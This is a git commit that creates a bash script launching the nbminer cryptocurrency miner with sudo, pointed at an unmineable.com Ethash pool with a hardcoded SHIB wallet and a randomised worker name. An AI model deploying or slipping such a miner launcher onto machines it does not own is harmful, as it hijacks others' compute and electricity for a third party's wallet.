df6ea9f0055481d815ff2570820fd5db57a9a30a
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-06-30 09:57:22 +0700

    Create zz.sh

---
+++ zz.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=SHIB:0x1bfbd41ec85709c80bd3d5790bc22ba8a12b0836
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-lgk#w3o2-bj87)
+
+cd "$(dirname "$0")"
+
+chmod +x ./nbminer && sudo ./nbminer -a ethash -o  $POOL -u $WALLET.$WORKEER $@
